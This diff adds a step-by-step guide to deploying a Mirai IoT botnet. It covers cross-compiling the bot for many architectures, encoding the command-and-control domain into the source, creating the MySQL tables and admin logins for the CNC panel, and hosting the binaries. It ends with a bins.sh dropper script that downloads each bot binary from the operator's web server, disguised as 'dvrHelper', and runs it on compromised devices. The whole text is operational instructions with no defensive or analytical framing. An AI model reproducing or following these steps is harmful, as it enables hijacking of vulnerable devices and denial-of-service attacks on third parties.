@@ -1,0 +1,165 @@
+1) Connect A Domain To Your Server And Install The Following
+apt-get update -y
+ apt-get upgrade -y
+ apt-get install gcc electric-fence sudo git apache2 screen tftpd tftp xinetd -y
+ apt-get install mysql-server mysql-client -y
+ 
+(2) Now We Need To Install Golang From Source (https://pastebin.com/zEj9H9su)
+wget https://storage.googleapis.com/golang/go1.8.3.linux-amd64.tar.gz
+sudo tar -xvf go1.8.3.linux-amd64.tar.gz
+sudo mv go /usr/local
+export GOROOT=/usr/local/go
+export GOPATH=$HOME/Projects/Proj1
+export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
+To see if Go installed correctly type in
+go version
+if you see go version go1.8.3 linux/amd64
+then go installed correctly
+ 
+(3) Time To Cross Compile
+mkdir /etc/xcompile
+cd /etc/xcompile
+ 
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
+wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
+ 
+tar -jxf cross-compiler-armv4l.tar.bz2
+tar -jxf cross-compiler-i586.tar.bz2
+tar -jxf cross-compiler-i686.tar.bz2
+tar -jxf cross-compiler-m68k.tar.bz2
+tar -jxf cross-compiler-mips.tar.bz2
+tar -jxf cross-compiler-mipsel.tar.bz2
+tar -jxf cross-compiler-powerpc.tar.bz2
+tar -jxf cross-compiler-sh4.tar.bz2
+tar -jxf cross-compiler-sparc.tar.bz2
+tar -jxf cross-compiler-armv6l.tar.bz2
+ 
+rm *.tar.bz2
+mv cross-compiler-armv4l armv4l
+mv cross-compiler-i586 i586
+mv cross-compiler-i686 i686
+mv cross-compiler-m68k m68k
+mv cross-compiler-mips mips
+mv cross-compiler-mipsel mipsel
+mv cross-compiler-powerpc powerpc
+mv cross-compiler-sh4 sh4
+mv cross-compiler-sparc sparc
+mv cross-compiler-armv6l armv6l
+ 
+(4) Time To Execute The Golang Paths
+export PATH=$PATH:/etc/xcompile/armv4l/bin
+export PATH=$PATH:/etc/xcompile/armv6l/bin
+export PATH=$PATH:/etc/xcompile/i586/bin
+export PATH=$PATH:/etc/xcompile/i686/bin
+export PATH=$PATH:/etc/xcompile/m68k/bin
+export PATH=$PATH:/etc/xcompile/mips/bin
+export PATH=$PATH:/etc/xcompile/mipsel/bin
+export PATH=$PATH:/etc/xcompile/powerpc/bin
+export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
+export PATH=$PATH:/etc/xcompile/sh4/bin
+export PATH=$PATH:/etc/xcompile/sparc/bin
+export PATH=$PATH:/etc/xcompile/armv6l/bin
+export PATH=$PATH:/usr/local/go/bin
+export GOPATH=$HOME/Documents/go
+ 
+(5) Getting the drivers and stringing domain
+go get github.com/go-sql-driver/mysql
+go get github.com/mattn/go-shellwords
+cd tools
+gcc enc.c -o enc -pthread
+./enc string domain.com copy and paste the string and xord number into a file so you dont forget it
+ 
+(6) Linking domain
+Go to table.c in /mirai/bot
+replace the then get your xords thing then where you see add_entry(TABLE_CNC_DOMAIN you wanna replace the string there
+then you wanna take the number 30 and put your xord number there. where you see add_entry(TABLE_SCAN_CB_DOMAIN do the exact same thing for there then exit and save the file
+make sure you dont mess up either
+ 
+(7) Setting Up The Database
+In mirai/cnc edit the main.go
+        const DatabaseAddr string   = "127.0.0.1:3306"
+        const DatabaseAddr string   = "root"
+        const DatabaseAddr string   = "mysql pass here"
+        const DatabaseAddr string   = "mirai"
+ 
+(8) Set up the database in mysql
+mysql -u root -p
+then enter password
+create database mirai;
+use mirai
+then enter this
+CREATE TABLE `history` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `user_id` int(10) unsigned NOT NULL,
+  `time_sent` int(10) unsigned NOT NULL,
+  `duration` int(10) unsigned NOT NULL,
+  `command` text NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  PRIMARY KEY (`id`),
+  KEY `user_id` (`user_id`)
+);
+ 
+CREATE TABLE `users` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `username` varchar(32) NOT NULL,
+  `password` varchar(32) NOT NULL,
+  `duration_limit` int(10) unsigned DEFAULT NULL,
+  `cooldown` int(10) unsigned NOT NULL,
+  `wrc` int(10) unsigned DEFAULT NULL,
+  `last_paid` int(10) unsigned NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  `admin` int(10) unsigned DEFAULT '0',
+  `intvl` int(10) unsigned DEFAULT '30',
+  `api_key` text,
+  PRIMARY KEY (`id`),
+  KEY `username` (`username`)
+);
+ 
+CREATE TABLE `whitelist` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) unsigned DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `prefix` (`prefix`)
+);
+ 
+after that you wanna make logins to who ever you want on the net for ex
+INSERT INTO users VALUES (NULL, 'root', 'bushdid911', 0, 0, 0, 0, -1, 1, 30, '');
+ 
+(9) Now go to your mirai folder and run ./build.sh release telnet
+then
+cd release
+mkdir /var/www/html/bins
+mv mirai* /var/www/html/bins
+screen ./cnc (then press control+a+d)
+ 
+(10) Setting Mirai bins.sh up
+go to /var/www/html/bins
+then do
+nano bins.sh
+then edit this then paste it into the bins.sh nano window
+#!/bin/sh
+ 
+# Edit
+WEBSERVER="ServerIP:80"
+# Stop editing now
+ 
+ 
+BINARIES="mirai.arm4n mirai.arm5n mirai.arm6n mirai.i586 mirai.i686 mirai.m68k mirai.mips mirai.mpsl mirai.ppc mirai.sh4 mirai.spc mirai.x86"
+ 
+for Binary in $BINARIES; do
+    wget http://$WEBSERVER/$Binary -O dvrHelper
+    chmod 777 dvrHelper
+    ./dvrHelper
+done
+ 
+Control+o then press y
+then control + x
